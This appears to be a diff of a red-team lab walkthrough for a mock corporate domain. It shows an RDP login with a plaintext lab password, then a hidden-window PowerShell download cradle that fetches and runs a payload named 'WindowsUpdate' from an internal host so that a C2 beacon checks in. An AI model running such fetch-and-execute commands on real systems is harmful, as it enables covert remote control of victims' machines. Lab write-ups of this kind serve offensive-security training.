@@ -72,7 +72,9 @@ Time to launch our Beacon. please rdp into wk01 by opening up a terminal on your
 xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp
 ```
 1. Open a command prompt by clicking the windows icon in the lower left and typing cmd.exe. Then paste the download cradle 
-2. `   powershell.exe -nop -w hidden -c "iex(irm -useb http://10.130.4.100:8888/WindowsUpdate)"`
+2. `powershell.exe -nop -w hidden -c "iex(irm -useb http://10.130.4.100:8888/WindowsUpdate)"`
+3. The window should disappear and a new beacon should check in and register on the C2.
+![[Pasted image 20240130233038.png]]
 ### Interacting with our beacon 
 
 
